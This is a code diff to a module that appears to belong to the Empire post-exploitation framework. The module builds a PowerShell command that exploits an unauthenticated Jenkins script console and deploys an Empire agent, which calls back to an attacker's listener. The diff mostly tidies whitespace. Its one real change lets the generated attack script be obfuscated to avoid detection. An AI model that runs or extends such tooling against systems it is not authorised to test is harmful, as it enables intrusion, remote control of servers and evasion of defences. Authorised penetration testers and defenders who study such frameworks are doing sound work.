@@ -16,13 +16,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
- 
+
             'OpsecSafe' : False,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'Deploys an Empire agent to a windows Jenkins server with unauthenticated access to script console.'
             ]
@@ -80,7 +80,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         # extract all of our options
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -103,7 +103,7 @@ class Module:
             #Cmd = launcher
             print helpers.color("Agent Launcher code: "+ launcher)
 
-        
+
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/exploitation/Exploit-Jenkins.ps1"
 
@@ -117,10 +117,14 @@ class Module:
         f.close()
 
         script = moduleCode
-
         script += "\nExploit-Jenkins"
         script += " -Rhost "+str(self.options['Rhost']['Value'])
         script += " -Port "+str(self.options['Port']['Value'])
         script += " -Cmd \"" + launcher + "\""
 
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
